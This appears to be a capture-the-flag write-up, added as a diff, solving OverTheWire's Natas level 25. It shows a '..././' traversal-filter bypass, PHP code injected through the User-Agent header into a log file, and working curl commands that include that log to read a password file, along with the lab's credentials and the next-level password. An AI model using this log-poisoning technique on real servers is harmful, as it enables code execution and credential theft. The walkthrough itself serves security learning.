@@ -1,0 +1,94 @@
+In this lab you are shown a quote where you can change it's language by
+expanding a select element. You're also given some source code as is
+usual.
+
+From the source code it's clear that you can change the value of the select
+element to potentially read a file. On the server there's a file for every
+language. When you select "en" for English then the server reads a file within
+the language directory called "en". 
+
+You had to bypass two checks in the code. 
+
+1.
+
+if(strstr($filename,"../")){
+  logRequest("Directory traversal attempt! fixing request.");
+  $filename=str_replace("../","",$filename);
+}
+
+2.
+
+if(strstr($filename,"natas_webpass")){
+  logRequest("Illegal file access detected! Aborting!");
+  exit(-1);
+}
+
+The first one simply replaces all instances of "../" in your select option's value
+with an empty string. So if you were to use inspect element in Google Chrome to
+add: <option>../../../../../etc/natas_webpass/natas26</option>, then the code
+would remove all of the instances of "../" and you would not retrieve the
+password.
+
+The second one exits the program if it detects the string "natas_webpass" in the
+selected option. This was trickier to work around.
+
+To bypass the first check I fiddled around in a php shell. I figured out that I
+could use "..././" as a stand-in for "../". Because once you remove the "../"
+from "..././" you get "../". So now my thought was to create this select option:
+<option>../../../../../etc/natas_webpass/natas26</option>.
+
+Now I had to bypass the second check. Here is what the logRequest function looks
+like in the source code:
+
+function logRequest($message){
+  $log="[". date("d.m.Y H::i:s",time()) ."]";
+  $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+  $log=$log . " \"" . $message ."\"\n"; 
+  $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+  fwrite($fd,$log);
+  fclose($fd);
+}
+
+There's no validation of the user agent. Here's an example of how I checked that
+if I was able to inject any php code via the user agent:
+
+1. curl -u "natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c" -d "lang=en" -H
+'User-Agent: <? echo "Wow, I can inject some php code for the user-agent";  ?>'
+-b cookie.txt -c cookie.txt http://natas25.natas.labs.overthewire.org/
+
+2. cat cookie.txt
+
+3. Copied the PHPSESSID cookie value (necessary for step 4), which in my case was
+   1baipuiqb6jk8t6hnaiicj3vc6
+
+4. curl -u "natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c" -d
+   "lang=..././logs/natas25_1baipuiqb6jk8t6hnaiicj3vc6.log" -H 'User-Agent: <? echo
+   "Wow, I can inject some php code for the user-agent";  ?>' -b cookie.txt -c
+   cookie.txt http://natas25.natas.labs.overthewire.org/
+
+After step 4 I was able to see this line in the output of curl:
+
+[09.12.2019 21::42:17] Wow, I can inject some php code for the user-agent
+"Directory traversal attempt! fixing request."
+
+After seeing that I was able to inject php code I included the
+"/etc/natas_webpass/natas26" with the following command:
+
+curl -u "natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c" -d
+"lang=..././logs/natas25_1baipuiqb6jk8t6hnaiicj3vc6.log" -H 'User-Agent: <? echo
+include("/etc/natas_webpass/natas26");  ?>' -b cookie.txt -c cookie.txt
+http://natas25.natas.labs.overthewire.org/
+
+With this command I saw the following line in the curl command output:
+
+[09.12.2019 21::50:31] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+
+How does this work?
+
+Since I have an instance of "../" in the value of the lang form field, the
+request is logged. Part of this log is the user agent without any validation. I
+was able to insert php code into the log file. I was able to get the page to
+include this log file and output the file to the web page. When the log file is
+included my php code is executed which prints the password file. 
+
+natas26 password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
